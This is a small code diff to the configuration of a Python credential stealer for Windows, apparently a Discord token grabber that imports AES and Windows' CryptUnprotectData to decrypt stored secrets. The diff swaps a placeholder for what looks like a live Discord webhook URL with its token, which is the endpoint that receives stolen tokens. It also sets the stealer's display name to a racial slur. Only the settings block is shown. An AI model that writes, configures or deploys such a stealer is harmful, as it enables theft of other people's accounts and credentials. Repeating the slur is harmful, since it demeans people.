@@ -7,9 +7,9 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 config = {
-  "webhook": "https://discord.com/api/webhooks/Your/Webhook!", # Put your Discord Webhook Here!
+  "webhook": "https://discord.com/api/webhooks/1067581600969269248/aE9FbZtZ9LLmFme1wAifD9N0YsUzRU2UmLXUUhj7vC5UJ9VsK20E3reDwTp5Pw6t3-dA", # Put your Discord Webhook Here!
   "color": 0xFFFF00, # Set this to the hex code of the color you'd like the embed to be (Keep the 0x at the beginning)
-  "stealerName": "Volt", # This can be anything really. (Preference)
+  "stealerName": "NIGGA JUST GOT BEAMED", # This can be anything really. (Preference)
   "ping": True # Ping @everyone when a token is found?
 }
 
